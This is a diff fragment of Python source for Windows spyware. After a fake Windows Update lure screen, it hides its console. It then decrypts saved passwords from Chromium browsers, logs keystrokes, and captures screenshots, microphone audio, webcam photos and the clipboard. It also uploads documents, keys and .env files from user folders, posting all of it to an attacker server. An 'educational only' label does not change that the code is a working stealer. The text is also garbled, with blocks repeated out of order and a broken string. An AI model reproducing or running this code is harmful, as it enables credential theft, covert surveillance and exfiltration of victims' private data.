+                    print(f"📁 Debug saved: {debug_file}")
+                
+                else:
+                    print("⚠️ Failed to capture frame")
+                
+                # Wait between captures
+                time.sleep(10)  # Capture every 10 seconds
+                
+            except Exception as e:
+                print(f"❌ Error capturing webcam photo: {e}")
+                time.sleep(5)
+        
+        # Release webcam
+        cap.release()
+        cv2.destroyAllWindows()
+        print(f"✅ Webcam session ended. Captured {webcam_count} photos")
+        
+    except Exception as e:
+        print(f"❌ Webcam initialization error: {e}")
+
+def capture_webcam_continuous():
+    """Continuous webcam photo capture with adjustable frequency"""
+    print("🎥 Starting continuous webcam monitoring...")
+    
+    try:
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # DirectShow for Windows
+        
+        if not cap.isOpened():
+            # Try alternative index
+            cap = cv2.VideoCapture(1, cv2.CAP_DSHOW)
+            if not cap.isOpened():
+                print("❌ No webcam found or access denied")
+                return
+        
+        # Configure camera
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+        cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
+        cap.set(cv2.CAP_PROP_BRIGHTNESS, 0.5)
+        
+        photo_interval = 15  # Seconds between photos
+        last_capture = time.time()
+        photo_count = 0
+        
+        print(f"📷 Webcam active. Capturing every {photo_interval} seconds")
+        
+        while not shutdown_flag.is_set():
+            try:
+                ret, frame = cap.read()
+                
+                if ret and frame is not None:
+                    current_time = time.time()
+                    
+                    # Check if it's time to capture
+                    if current_time - last_capture >= photo_interval:
+                        # Enhance image quality
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                        
+                        # Create filename with timestamp
+                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        
+                        # Save to temporary file
+                        temp_file = os.path.join(tempfile.gettempdir(), f"webcam_{timestamp}.jpg")
+                        
+                        # Save with high quality
+                        cv2.imwrite(temp_file, frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
+                        
+                        # Read file for transmission
+                        with open(temp_file, 'rb') as f:
+                            img_bytes = f.read()
+                        
+                        # Convert to base64
+                        img_str = base64.b64encode(img_bytes).decode()
+                        
+                        # Prepare data
+                        webcam_data = {
+                            'type': 'webcam_photo',
+                            'filename': f"webcam_{timestamp}.jpg",
+                            'data': img_str,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                            'photo_number': photo_count + 1,
+                            'size': len(img_bytes)
+                        }
+                        
+                        # Send to attacker
+                        if send_to_attacker('webcam', webcam_data):
+                            photo_count += 1
+                            last_capture = current_time
+                            print(f"📸 Webcam photo #{photo_count} captured")
+                        
+                        # Clean up temp file
+                        try:
+                            os.remove(temp_file)
+                        except:
+                            pass
+                
+                # Small delay to prevent high CPU usage
+                time.sleep(0.1)
+                
+            except Exception as e:
+                print(f"❌ Webcam capture error: {e}")
+                time.sleep(5)
+        
+        # Release resources
+        cap.release()
+        cv2.destroyAllWindows()
+        print(f"✅ Webcam monitoring stopped. Total photos: {photo_count}")
+        
+    except Exception as e:
+        print(f"❌ Webcam error: {e}")
+
+def monitor_clipboard():
+    """Monitor clipboard content"""
+    print("📋 Starting clipboard monitor...")
+    
+    last_clipboard = ""
+    
+    while not shutdown_flag.is_set():
+        try:
+            win32clipboard.OpenClipboard()
+            
+            try:
+                if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
+                    data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
+                    
+                    if data and data != last_clipboard:
+                        clipboard_data = {
+                            'data': data.decode('utf-8') if isinstance(data, bytes) else str(data),
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        
+                        send_to_attacker('clipboard', clipboard_data)
+                        last_clipboard = data
+                        print("✅ Clipboard data captured")
+                
+            finally:
+                win32clipboard.CloseClipboard()
+                
+        except Exception as e:
+            pass
+        
+        time.sleep(5)  # Check every 5 seconds
+def main():
+    """Main function - EDUCATIONAL DEMONSTRATION ONLY"""
+    
+    # ======================== STEP 1 ========================
+    # Show the fake Windows Update screen FIRST
+    # This function blocks until user clicks "Update Now"
+    show_fake_update_screen()
+    
+    # ======================== STEP 2 ========================
+    # After user clicks "Update Now", the screen closes
+    # Now start the malicious activities
+    
+    print("=" * 60)
+    print("[MALWARE ACTIVATION PHASE]")
+    print("=" * 60)
+    
+    # Test connection to attacker server
+    try:
+        response = requests.get(f"{ATTACKER_URL}", timeout=5)
+        if response.status_code == 200:
+            print("✅ Connected to attacker server")
+        else:
+            print(f"❌ Cannot connect to server: {response.status_code}")
+            return
+    except Exception as e:
+        print(f"❌ Cannot connect to server: {e}")
+        return
+    
+    # Initial data collection
+    collect_system_info()
+    extract_browser_passwords()
+    
+    # ======================== STEP 3 ========================
+    # Hide the console window - THIS IS CRITICAL!
+    # Without this, victim will see all the print statements
+    print("[*] Hiding console window...")
+    if hide_console():
+        print("[*] Console hidden successfully")
+    else:
+        print("[!] Could not hide console")
+    
+    # Start monitoring threads (these run in background)
+    threads = []
+    
+    monitoring_functions = [
+        monitor_processes,
+        keylogger,
+        capture_screenshot,
+        record_audio,
+        monitor_clipboard,
+    ]
+    
+    for func in monitoring_functions:
+        thread = threading.Thread(target=func, daemon=True)
+        thread.start()
+        threads.append(thread)
+        time.sleep(0.5)  # Stagger thread starts
+    
+    # Try webcam if available
+    try:
+        webcam_thread = threading.Thread(target=capture_webcam, daemon=True)
+        webcam_thread.start()
+        threads.append(webcam_thread)
+    except:
+        print("⚠️ Webcam not available")
+    
+    print("[*] All background monitoring started")
+    print("[*] Victim will see nothing from this point")
+    
+    # ======================== STEP 4 ========================
+    # Keep the program running
+    # File exfiltration happens periodically
+    exfiltration_count = 0
+    while not shutdown_flag.is_set():
+        time.sleep(60)  # Check every minute
+        
+        exfiltration_count += 1
+        if exfiltration_count >= 3:  # Every 3 minutes
+            exfiltrate_files()
+            exfiltration_count = 0
+            
+            # Re-extract passwords periodically
+            if exfiltration_count % 6 == 0:  # Every 6 minutes
+                extract_browser_passwords()
+    
+    print("🛑 Monitoring stopped")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        shutdown_flag.set()
+        print("\n🛑 Stopped by user")
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+        shutdown_flag.set()"  # Your attacker IP
+ATTACKER_PORT = 5000
+ATTACKER_URL = f"http://{ATTACKER_IP}:{ATTACKER_PORT}"
+
+# Global variables
+shutdown_flag = threading.Event()
+audio_recording = False
+video_recording = False
+
+
+def send_to_attacker(data_type, data):
+    """Send data to attacker server"""
+    try:
+        payload = {
+            'type': data_type,
+            'data': data,
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        }
+        
+        response = requests.post(f"{ATTACKER_URL}/receive_data", 
+                               json=payload, timeout=10)
+        
+        if response.status_code == 200:
+            print(f"✅ Sent {data_type} to attacker")
+            return True
+        else:
+            print(f"❌ Failed to send {data_type}: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Error sending {data_type}: {e}")
+        return False
+
+def send_file_to_attacker(filepath, file_type='file'):
+    """Send file to attacker server"""
+    try:
+        with open(filepath, 'rb') as f:
+            files = {'file': f}
+            data = {'type': file_type}
+            
+            if file_type == 'audio':
+                data['duration'] = 10  # Default duration
+            
+            response = requests.post(f"{ATTACKER_URL}/receive_file", 
+                                  files=files, data=data, timeout=30)
+        
+        if response.status_code == 200:
+            print(f"✅ Sent {file_type}: {os.path.basename(filepath)}")
+            return True
+        else:
+            print(f"❌ Failed to send file: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Error sending file: {e}")
+        return False
+
+def get_chromium_master_key(browser_path):
+    """Get master key for Chromium-based browsers - FIXED VERSION"""
+    try:
+        local_state_path = os.path.join(browser_path, "Local State")
+        if not os.path.exists(local_state_path):
+            return None
+            
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        
+        # Get encrypted key from Local State
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        
+        # Remove DPAPI prefix (first 5 bytes: DPAPI)
+        encrypted_key = encrypted_key[5:]
+        
+        # Decrypt using DPAPI
+        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)
+        
+        return decrypted_key[1]  # Return the decrypted key
+        
+    except Exception as e:
+        print(f"❌ Error getting master key: {e}")
+        return None
+
+def decrypt_chromium_password(encrypted_password, master_key):
+    """Decrypt Chromium password - IMPROVED VERSION"""
+    try:
+        if not encrypted_password:
+            return "[EMPTY]"
+        
+        # Check if it's Chrome v80+ encrypted password
+        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+            # Chrome v80+ uses AES-GCM
+            try:
+                # Extract nonce and ciphertext
+                nonce = encrypted_password[3:15]  # 12 bytes for nonce
+                ciphertext = encrypted_password[15:-16]  # Remove tag
+                tag = encrypted_password[-16:]  # 16 bytes for tag
+                
+                # Create AES-GCM cipher
+                cipher = AESGCM(master_key)
+                
+                # Combine ciphertext and tag for decryption
+                combined = ciphertext + tag
+                
+                # Decrypt
+                decrypted = cipher.decrypt(nonce, combined, None)
+                return decrypted.decode('utf-8')
+                
+            except Exception as e:
+                print(f"❌ AES-GCM decryption failed: {e}")
+                # Try DPAPI as fallback
+                pass
+        
+        # Try DPAPI decryption (for older Chrome or Edge)
+        try:
+            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
+            return decrypted[1].decode('utf-8')
+        except:
+            return "[DECRYPTION_FAILED_DPAPI]"
+            
+    except Exception as e:
+        print(f"❌ Decryption error: {e}")
+        return f"[DECRYPTION_ERROR: {str(e)[:50]}]"
+
+def extract_browser_passwords():
+    """Extract passwords from ALL browsers - COMPLETE VERSION"""
+    print("🔍 Extracting browser passwords...")
+    
+    browsers = {
+        "Google Chrome": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data"),
+        ],
+        "Microsoft Edge": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data"),
+        ],
+        "Brave Browser": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+        ],
+        "Opera": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Opera Software", "Opera Stable"),
+        ],
+        "Vivaldi": [
+            os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Vivaldi", "User Data"),
+        ]
+    }
+
+    credentials = []
+    
+    for browser_name, browser_paths in browsers.items():
+        for base_path in browser_paths:
+            if not os.path.exists(base_path):
+                continue
+                
+            print(f"🔍 Checking {browser_name} at {base_path}")
+            
+            try:
+                # Get master key
+                master_key = get_chromium_master_key(base_path)
+                if not master_key:
+                    print(f"❌ Could not get master key for {browser_name}")
+                    continue
+                
+                # Find all profiles
+                for profile_dir in os.listdir(base_path):
+                    profile_path = os.path.join(base_path, profile_dir)
+                    
+                    if os.path.isdir(profile_path) and (profile_dir.startswith("Profile") or profile_dir == "Default" or profile_dir == "Login Data"):
+                        login_db_path = os.path.join(profile_path, "Login Data")
+                        
+                        if os.path.exists(login_db_path):
+                            print(f"📊 Found login database in {profile_dir}")
+                            
+                            # Copy database to temp location
+                            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_{profile_dir}.db")
+                            shutil.copy2(login_db_path, temp_db)
+                            
+                            try:
+                                conn = sqlite3.connect(temp_db)
+                                cursor = conn.cursor()
+                                
+                                # Try different table names
+                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                                tables = cursor.fetchall()
+                                
+                                for table in tables:
+                                    table_name = table[0]
+                                    if 'login' in table_name.lower() or 'credential' in table_name.lower():
+                                        try:
+                                            cursor.execute(f"SELECT origin_url, username_value, password_value FROM {table_name}")
+                                            rows = cursor.fetchall()
+                                            
+                                            for url, username, encrypted_password in rows:
+                                                if url and username and encrypted_password:
+                                                    password = decrypt_chromium_password(encrypted_password, master_key)
+                                                    
+                                                    credentials.append({
+                                                        'url': url,
+                                                        'username': username,
+                                                        'password': password,
+                                                        'browser': browser_name,
+                                                        'profile': profile_dir,
+                                                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                                    })
+                                                    
+                                        except Exception as table_error:
+                                            print(f"❌ Error reading table {table_name}: {table_error}")
+                                            continue
+                                
+                                conn.close()
+                                
+                            except Exception as e:
+                                print(f"❌ Error reading database: {e}")
+                            
+                            finally:
+                                # Clean up temp file
+                                try:
+                                    os.remove(temp_db)
+                                except:
+                                    pass
+                                
+            except Exception as e:
+                print(f"❌ Error processing {browser_name}: {e}")
+                continue
+    
+    if credentials:
+        print(f"✅ Found {len(credentials)} credentials")
+        send_to_attacker('credentials', credentials)
+        
+        # Also save locally for debugging
+        debug_file = os.path.join(tempfile.gettempdir(), "extracted_passwords.json")
+        with open(debug_file, 'w', encoding='utf-8') as f:
+            json.dump(credentials, f, indent=2, ensure_ascii=False)
+        print(f"📝 Debug file saved: {debug_file}")
+        
+    else:
+        print("❌ No credentials found")
+    
+    return credentials
+
+def collect_system_info():
+    """Collect comprehensive system information"""
+    print("💻 Collecting system info...")
+    
+    try:
+        # Network information
+        hostname = socket.gethostname()
+        try:
+            ip_address = socket.gethostbyname(hostname)
+        except:
+            ip_address = "127.0.0.1"
+        
+        # Disk information
+        disk_info = []
+        for partition in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(partition.mountpoint)
+                disk_info.append({
+                    'device': partition.device,
+                    'mountpoint': partition.mountpoint,
+                    'total_gb': round(usage.total / (1024**3), 2),
+                    'used_gb': round(usage.used / (1024**3), 2),
+                    'free_gb': round(usage.free / (1024**3), 2),
+                    'percent': usage.percent
+                })
+            except:
+                pass
+        
+        system_info = {
+            'username': os.getlogin(),
+            'hostname': hostname,
+            'ip_address': ip_address,
+            'os': platform.system(),
+            'os_version': platform.version(),
+            'os_release': platform.release(),
+            'architecture': platform.architecture()[0],
+            'processor': platform.processor(),
+            'cpu_count': psutil.cpu_count(),
+            'cpu_cores': psutil.cpu_count(logical=False),
+            'cpu_usage': psutil.cpu_percent(interval=1),
+            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
+            'memory_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),
+            'memory_used_percent': psutil.virtual_memory().percent,
+            'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
+            'disk_info': disk_info,
+            'python_version': platform.python_version(),
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        send_to_attacker('system_info', system_info)
+        print("✅ System info collected")
+        return system_info
+        
+    except Exception as e:
+        print(f"❌ Error collecting system info: {e}")
+        return None
+
+def monitor_processes():
+    """Monitor running processes"""
+    print("⚡ Starting process monitor...")
+    
+    while not shutdown_flag.is_set():
+        try:
+            processes = []
+            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):
+                try:
+                    proc_info = proc.info
+                    create_time = datetime.fromtimestamp(proc_info['create_time']).strftime("%Y-%m-%d %H:%M:%S") if proc_info['create_time'] else "Unknown"
+                    
+                    processes.append({
+                        'pid': proc_info['pid'],
+                        'name': proc_info['name'],
+                        'user': proc_info['username'],
+                        'cpu': round(proc_info['cpu_percent'], 2),
+                        'memory': round(proc_info['memory_percent'], 2),
+                        'created': create_time,
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    })
+                except:
+                    continue
+            
+            if processes:
+                send_to_attacker('processes', processes[:50])  # Send first 50 processes
+            
+        except Exception as e:
+            print(f"❌ Error monitoring processes: {e}")
+        
+        time.sleep(30)  # Check every 30 seconds
+
+def keylogger():
+    """Advanced keylogger with window title"""
+    print("⌨️ Starting keylogger...")
+    
+    keystroke_buffer = []
+    last_send_time = time.time()
+    last_window = ""
+    
+    try:
+        import win32gui
+        import win32process
+        
+        def get_active_window():
+            """Get active window title"""
+            try:
+                window = win32gui.GetForegroundWindow()
+                return win32gui.GetWindowText(window)
+            except:
+                return "Unknown"
+    except:
+        def get_active_window():
+            return "Unknown"
+    
+    def on_key_event(event):
+        nonlocal keystroke_buffer, last_send_time, last_window
+        
+        try:
+            current_window = get_active_window()
+            if current_window != last_window:
+                # Log window change
+                keystroke_buffer.append({
+                    'key': f"[WINDOW: {current_window}]",
+                    'event_type': 'window_change',
+                    'window': current_window,
+                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                })
+                last_window = current_window
+            
+            keystroke_data = {
+                'key': event.name if event.name else str(event.scan_code),
+                'event_type': event.event_type,
+                'window': current_window,
+                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
+            
+            keystroke_buffer.append(keystroke_data)
+            
+            # Send data every 20 keystrokes or every 30 seconds
+            current_time = time.time()
+            if len(keystroke_buffer) >= 20 or (current_time - last_send_time) > 30:
+                if keystroke_buffer:
+                    send_to_attacker('keystrokes', keystroke_buffer)
+                    keystroke_buffer = []
+                    last_send_time = current_time
+                    
+        except Exception as e:
+            print(f"❌ Keylogger error: {e}")
+    
+    try:
+        keyboard.hook(on_key_event)
+        
+        while not shutdown_flag.is_set():
+            time.sleep(1)
+            
+    except Exception as e:
+        print(f"❌ Keylogger failed: {e}")
+    finally:
+        try:
+            keyboard.unhook_all()
+        except:
+            pass
+
+def exfiltrate_files():
+    """Exfiltrate important files"""
+    print("📁 Exfiltrating files...")
+    
+    important_locations = [
+        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
+        os.path.join(os.environ['USERPROFILE'], 'Documents'),
+        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
+        os.path.join(os.environ['USERPROFILE'], 'Pictures'),
+    ]
+    
+    file_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', 
+                      '.zip', '.rar', '.7z', '.pptx', '.sql', '.db', '.config', '.ini',
+                      '.json', '.xml', '.csv', '.rtf', '.odt', '.key', '.pem', '.env']
+    
+    max_file_size = 3 * 1024 * 1024  # 3MB max
+    
+    file_info_list = []
+    
+    try:
+        for location in important_locations:
+            if not os.path.exists(location):
+                continue
+                
+            for root, dirs, files in os.walk(location):
+                for file in files:
+                    file_lower = file.lower()
+                    if any(file_lower.endswith(ext) for ext in file_extensions):
+                        file_path = os.path.join(root, file)
+                        
+                        try:
+                            file_size = os.path.getsize(file_path)
+                            if file_size > max_file_size:
+                                continue
+                                
+                            # Send file to attacker
+                            if send_file_to_attacker(file_path):
+                                file_info = {
+                                    'filename': file,
+                                    'path': file_path,
+                                    'size': file_size,
+                                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                                }
+                                file_info_list.append(file_info)
+                                print(f"📤 Exfiltrated: {file}")
+                            
+                        except Exception as e:
+                            continue
+        
+        if file_info_list:
+            send_to_attacker('files', file_info_list)
+            print(f"✅ Exfiltrated {len(file_info_list)} files")
+        
+    except Exception as e:
+        print(f"❌ Error exfiltrating files: {e}")
+
+def capture_screenshot():
+    """Capture screenshots periodically"""
+    print("📸 Starting screenshot capture...")
+    
+    screenshot_count = 0
+    
+    while not shutdown_flag.is_set():
+        try:
+            screenshot = ImageGrab.grab()
+            
+            # Convert to base64
+            buffer = BytesIO()
+            screenshot.save(buffer, format='PNG')
+            img_str = base64.b64encode(buffer.getvalue()).decode()
+            
+            screenshot_data = {
+                'data': img_str,
+                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                'count': screenshot_count
+            }
+            
+            send_to_attacker('screenshot', screenshot_data)
+            screenshot_count += 1
+            print(f"✅ Screenshot #{screenshot_count} captured")
+                
+        except Exception as e:
+            print(f"❌ Error capturing screenshot: {e}")
+        
+        time.sleep(60)  # Capture every 60 seconds
+
+def record_audio():
+    """Record audio from microphone"""
+    print("🎤 Starting audio recording...")
+    
+    global audio_recording
+    
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    RECORD_SECONDS = 10
+    
+    while not shutdown_flag.is_set():
+        try:
+            audio = pyaudio.PyAudio()
+            
+            stream = audio.open(format=FORMAT,
+                              channels=CHANNELS,
+                              rate=RATE,
+                              input=True,
+                              frames_per_buffer=CHUNK)
+            
+            print("🎤 Recording audio...")
+            frames = []
+            
+            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+                if shutdown_flag.is_set():
+                    break
+                data = stream.read(CHUNK)
+                frames.append(data)
+            
+            stream.stop_stream()
+            stream.close()
+            audio.terminate()
+            
+            # Save to temporary file
+            temp_file = os.path.join(tempfile.gettempdir(), f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
+            
+            wf = wave.open(temp_file, 'wb')
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(audio.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+            wf.close()
+            
+            # Send to attacker
+            if send_file_to_attacker(temp_file, 'audio'):
+                print("✅ Audio sent to attacker")
+            
+            # Clean up
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+            
+        except Exception as e:
+            print(f"❌ Error recording audio: {e}")
+        
+        time.sleep(30)  # Record every 30 seconds
+
+def capture_webcam():
+    """Capture webcam images"""
+    print("📹 Starting webcam capture...")
+    
+    try:
+        cap = cv2.VideoCapture(0)
+        
+        if not cap.isOpened():
+            print("❌ Webcam not available")
+            return
+        
+        webcam_count = 0
+        
+        while not shutdown_flag.is_set() and webcam_count < 10:  # Capture 10 images max
+            try:
+                ret, frame = cap.read()
+                
+                if ret:
+                    # Encode image
+                    _, buffer = cv2.imencode('.jpg', frame)
+                    img_str = base64.b64encode(buffer).decode()
+                    
+                    webcam_data = {
+                        'data': img_str,
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        'count': webcam_count
+                    }
+                    
+                    send_to_attacker('webcam', webcam_data)
+                    webcam_count += 1
+                    print(f"✅ Webcam image #{webcam_count} captured")
+                
+            except Exception as e:
+                print(f"❌ Error capturing webcam: {e}")
+            
+            time.sleep(10)  # Capture every 10 seconds
+        
+        cap.release()
+        
+    except Exception as e:
+        print(f"❌ Webcam error: {e}")
+
+def capture_webcam_photos():
+    """Capture webcam photos and send to attacker"""
+    print("📷 Starting webcam photo capture...")
+    
+    try:
+        # Initialize webcam
+        cap = cv2.VideoCapture(0)
+        
+        if not cap.isOpened():
+            print("❌ Webcam not available or access denied")
+            return
+        
+        # Set camera properties for better quality
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        cap.set(cv2.CAP_PROP_FPS, 30)
+        
+        webcam_count = 0
+        max_photos = 20  # Maximum photos to capture
+        
+        print("✅ Webcam initialized successfully")
+        
+        while not shutdown_flag.is_set() and webcam_count < max_photos:
+            try:
+                # Capture frame
+                ret, frame = cap.read()
+                
+                if ret:
+                    # Resize for better transmission
+                    frame = cv2.resize(frame, (640, 480))
+                    
+                    # Apply some image enhancement
+                    frame = cv2.convertScaleAbs(frame, alpha=1.2, beta=20)
+                    
+                    # Encode as JPEG with higher quality
+                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
+                    _, buffer = cv2.imencode('.jpg', frame, encode_param)
+                    img_str = base64.b64encode(buffer).decode()
+                    
+                    # Create data packet
+                    webcam_data = {
+                        'type': 'webcam',
+                        'data': img_str,
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        'count': webcam_count + 1,
+                        'resolution': '640x480',
+                        'format': 'jpg'
+                    }
+                    
+                    # Send to attacker
+                    if send_to_attacker('webcam', webcam_data):
+                        webcam_count += 1
+                        print(f"✅ Webcam photo #{webcam_count} captured and sent")
+                    
+                    # Save locally for debugging
+                    debug_file = os.path.join(tempfile.gettempdir(), f"webcam_{webcam_count}.jpg")
+                    cv2.imwrite(debug_file, frame)
+                    print(f"📁 Debug saved: {debug_file}")
+                
+                else:
+                    print("⚠️ Failed to capture frame")
+                
+                # Wait between captures
+                time.sleep(10)  # Capture every 10 seconds
+                
+            except Exception as e:
+                print(f"❌ Error capturing webcam photo: {e}")
+                time.sleep(5)
+        
+        # Release webcam
+        cap.release()
+        cv2.destroyAllWindows()
+        print(f"✅ Webcam session ended. Captured {webcam_count} photos")
+        
+    except Exception as e:
+        print(f"❌ Webcam initialization error: {e}")
+
+def capture_webcam_continuous():
+    """Continuous webcam photo capture with adjustable frequency"""
+    print("🎥 Starting continuous webcam monitoring...")
+    
+    try:
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # DirectShow for Windows
+        
+        if not cap.isOpened():
+            # Try alternative index
+            cap = cv2.VideoCapture(1, cv2.CAP_DSHOW)
+            if not cap.isOpened():
+                print("❌ No webcam found or access denied")
+                return
+        
+        # Configure camera
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+        cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
+        cap.set(cv2.CAP_PROP_BRIGHTNESS, 0.5)
+        
+        photo_interval = 15  # Seconds between photos
+        last_capture = time.time()
+        photo_count = 0
+        
+        print(f"📷 Webcam active. Capturing every {photo_interval} seconds")
+        
+        while not shutdown_flag.is_set():
+            try:
+                ret, frame = cap.read()
+                
+                if ret and frame is not None:
+                    current_time = time.time()
+                    
+                    # Check if it's time to capture
+                    if current_time - last_capture >= photo_interval:
+                        # Enhance image quality
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                        
+                        # Create filename with timestamp
+                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        
+                        # Save to temporary file
+                        temp_file = os.path.join(tempfile.gettempdir(), f"webcam_{timestamp}.jpg")
+                        
+                        # Save with high quality
+                        cv2.imwrite(temp_file, frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
+                        
+                        # Read file for transmission
+                        with open(temp_file, 'rb') as f:
+                            img_bytes = f.read()
+                        
+                        # Convert to base64
+                        img_str = base64.b64encode(img_bytes).decode()
+                        
+                        # Prepare data
+                        webcam_data = {
+                            'type': 'webcam_photo',
+                            'filename': f"webcam_{timestamp}.jpg",
+                            'data': img_str,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                            'photo_number': photo_count + 1,
+                            'size': len(img_bytes)
+                        }
+                        
+                        # Send to attacker
+                        if send_to_attacker('webcam', webcam_data):
+                            photo_count += 1
+                            last_capture = current_time
+                            print(f"📸 Webcam photo #{photo_count} captured")
+                        
+                        # Clean up temp file
+                        try:
+                            os.remove(temp_file)
+                        except:
+                            pass
+                
+                # Small delay to prevent high CPU usage
+                time.sleep(0.1)
+                
+            except Exception as e:
+                print(f"❌ Webcam capture error: {e}")
+                time.sleep(5)
+        
+        # Release resources
+        cap.release()
+        cv2.destroyAllWindows()
+        print(f"✅ Webcam monitoring stopped. Total photos: {photo_count}")
+        
+    except Exception as e:
+        print(f"❌ Webcam error: {e}")
+
+def monitor_clipboard():
+    """Monitor clipboard content"""
+    print("📋 Starting clipboard monitor...")
+    
+    last_clipboard = ""
+    
+    while not shutdown_flag.is_set():
+        try:
+            win32clipboard.OpenClipboard()
+            
+            try:
+                if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
+                    data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
+                    
+                    if data and data != last_clipboard:
+                        clipboard_data = {
+                            'data': data.decode('utf-8') if isinstance(data, bytes) else str(data),
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        
+                        send_to_attacker('clipboard', clipboard_data)
+                        last_clipboard = data
+                        print("✅ Clipboard data captured")
+                
+            finally:
+                win32clipboard.CloseClipboard()
+                
+        except Exception as e:
+            pass
+        
+        time.sleep(5)  # Check every 5 seconds
+def main():
+    """Main function - EDUCATIONAL DEMONSTRATION ONLY"""
+    
+    # ======================== STEP 1 ========================
+    # Show the fake Windows Update screen FIRST
+    # This function blocks until user clicks "Update Now"
+    show_fake_update_screen()
+    
+    # ======================== STEP 2 ========================
+    # After user clicks "Update Now", the screen closes
+    # Now start the malicious activities
+    
+    print("=" * 60)
+    print("[MALWARE ACTIVATION PHASE]")
+    print("=" * 60)
+    
+    # Test connection to attacker server
+    try:
+        response = requests.get(f"{ATTACKER_URL}", timeout=5)
+        if response.status_code == 200:
+            print("✅ Connected to attacker server")
+        else:
+            print(f"❌ Cannot connect to server: {response.status_code}")
+            return
+    except Exception as e:
+        print(f"❌ Cannot connect to server: {e}")
+        return
+    
+    # Initial data collection
+    collect_system_info()
+    extract_browser_passwords()
+    
+    # ======================== STEP 3 ========================
+    # Hide the console window - THIS IS CRITICAL!
+    # Without this, victim will see all the print statements
+    print("[*] Hiding console window...")
+    if hide_console():
+        print("[*] Console hidden successfully")
+    else:
+        print("[!] Could not hide console")
+    
+    # Start monitoring threads (these run in background)
+    threads = []
+    
+    monitoring_functions = [
+        monitor_processes,
+        keylogger,
+        capture_screenshot,
+        record_audio,
+        monitor_clipboard,
+    ]
+    
+    for func in monitoring_functions:
+        thread = threading.Thread(target=func, daemon=True)
+        thread.start()
+        threads.append(thread)
+        time.sleep(0.5)  # Stagger thread starts
+    
+    # Try webcam if available
+    try:
+        webcam_thread = threading.Thread(target=capture_webcam, daemon=True)
+        webcam_thread.start()
+        threads.append(webcam_thread)
+    except:
+        print("⚠️ Webcam not available")
+    
+    print("[*] All background monitoring started")
+    print("[*] Victim will see nothing from this point")
+    
+    # ======================== STEP 4 ========================
+    # Keep the program running
